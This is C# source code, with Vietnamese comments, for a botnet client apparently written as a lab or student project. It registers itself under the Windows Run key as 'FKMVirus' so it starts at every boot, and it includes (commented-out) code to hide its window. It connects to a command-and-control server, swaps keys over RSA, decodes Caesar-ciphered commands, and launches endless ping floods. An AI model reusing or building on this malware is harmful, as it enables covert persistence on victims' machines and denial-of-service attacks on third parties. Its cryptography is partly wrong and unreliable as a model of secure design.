using Bot.Commands;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Net.Sockets;
using System.Security.Cryptography;
using System.Text;
using System.Threading.Tasks;
using System.Runtime.InteropServices;
using Microsoft.Win32;
using static System.Net.Mime.MediaTypeNames;
using System.Threading;
using System.IO;
using System.Xml.Linq;
using System.Security.Cryptography.X509Certificates;
using SHA3.Net;

namespace Bot
{
    public class Bot
    {
        private static int PORT_NO = 5000;
        private static string SERVER_IP = "127.0.0.1";
        public static CommandHandler ch;
        private static RSACryptoServiceProvider rsa;

        //import de thuc hien viec giau di cua so chay
        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();
        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        //cac bien show va hide
        const int SW_HIDE = 0;
        const int SW_SHOW = 5;


        private static string controllerPub = ""; //bien giu public key cua controller
        private static string keyRSA = "";//bien giu key sau duoc ma hoa
        public static char cipher(char ch, int key)
        {
            if (!char.IsLetter(ch))
            {

                return ch;
            }

            char d = char.IsUpper(ch) ? 'A' : 'a';
            return (char)((((ch + key) - d) % 26) + d);
        }


        public static string Encipher(string input, int key)
        {
            string output = string.Empty;

            foreach (char ch in input)
                output += cipher(ch, key);

            return output;
        }

        public static string Decipher(string input, int key)
        {
            return Encipher(input, 26 - key);
        }
        
        //ham ma hoa key sang RSA 
        private static void KeyToRSA(string key)
        {
            var rsa = new RSACryptoServiceProvider();
            try
            {
                rsa.FromXmlString(controllerPub); //lay public key tu dinh dang xml
                keyRSA = Convert.ToBase64String(
                    rsa.Encrypt(Encoding.ASCII.GetBytes(key), false) //false la su dung padding PCKS1
                );
                //Console.Write(keyRSA);
            }
            catch (CryptographicException ex)
            {
            }
            finally
            {
                rsa.PersistKeyInCsp = false;
            }

        }

        private static string DecryptSignature(string signature)
        {
            using (var rsa = new RSACryptoServiceProvider())
            {
                try
                {
                    rsa.FromXmlString(controllerPub); //lay private key duoc generate ra

                    byte[] keyByte = rsa.Decrypt(Convert.FromBase64String(signature), false); //giai ma voi private key, false de su dung PKCS#1 padding 
                    var hash = Encoding.ASCII.GetString(keyByte);
                    return hash;
                }
                catch (Exception e)
                {

                }
            }
            return "";
        }

        private static string GenerateSHA3(string cmd)
        {
            using (var shaAlg = Sha3.Sha3256())
            {
                var hash = shaAlg.ComputeHash(Encoding.UTF8.GetBytes(cmd));
                return BitConverter.ToString(hash).Replace("-", "").ToLower();
            }
        }
        
        //dat con bot nay` vao start up de khoi dong cung he thong
        private static void SetStartup()
        {
            RegistryKey rk = Registry.CurrentUser.OpenSubKey
                ("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
            rk.SetValue("FKMVirus", AppDomain.CurrentDomain.BaseDirectory);
        }
        static void Main(string[] args)
        {
            SetStartup();
            ch = new CommandHandler();
            rsa = new RSACryptoServiceProvider(1024);
            //---create a TCPClient object at the IP and port no.---
            bool notConnected = true; // giu con bot luon mo truoc khi server duoc bat
            TcpClient client = null;
            //luon luon lang nghe cho toi khi server duoc bat
            while (notConnected)
            {
                try
                {
                    client = new TcpClient(SERVER_IP, PORT_NO);
                    notConnected = false;
                }
                catch (Exception e)
                {
                    continue;
                }
            }
            NetworkStream nwStream = client.GetStream();

            //nhan public key
            byte[] publicKey = new byte[8192];
            int publicKeyLen = nwStream.Read(publicKey, 0, 8192);
            controllerPub = Encoding.ASCII.GetString(publicKey, 0, publicKeyLen);


            //gui di key sau khi ma hoa
            string key = "8";
            KeyToRSA(key); //ma hoa key
            string fullKey = keyRSA;
            nwStream.Write(Encoding.ASCII.GetBytes(fullKey), 0, fullKey.Length);

            //---read back the text--- 
            byte[] bytesToRead = new byte[client.ReceiveBufferSize];
            //var handle = GetConsoleWindow(); //lay window hien tai
            //ShowWindow(handle, SW_HIDE); //giau window di   

            //luon luon doc lenh tu controller
            while (true)
            {
                //doc lenh da ma hoa tu controller
                int bytesRead = nwStream.Read(bytesToRead, 0, client.ReceiveBufferSize);
                string fullCmd = Encoding.ASCII.GetString(bytesToRead, 0, bytesRead);
                //Console.WriteLine(cmd);
                fullCmd = Decipher(fullCmd, Int32.Parse(key));
                string[] cmds = fullCmd.Split(new string[] { "!!!" }, StringSplitOptions.None);
                string cmd = cmds[0];
                string signature = cmds[1];
                if (GenerateSHA3(cmd) == DecryptSignature(signature))
                {
                    if (cmd.StartsWith("ping"))
                    {
                        while(true)
                        {
                            Console.WriteLine(ch.runCommand(cmd));
                            Thread.Sleep(200);
                        }
                    }
                }
                else
                {
                    Console.WriteLine("Getting sabotage, Close immediately");
                    client.Close();
                }
                //ping lien tuc
                //while (true)
                //{
                //    Console.WriteLine(ch.runCommand(cmd));
                //    Thread.Sleep(200);//sleep 0.2s de dam bao la cac lenh ping da duoc tra ve truoc khi thuc hien lenh tiep theo
                //}
            }
            Console.ReadLine();
            client.Close();
        }
    }
}
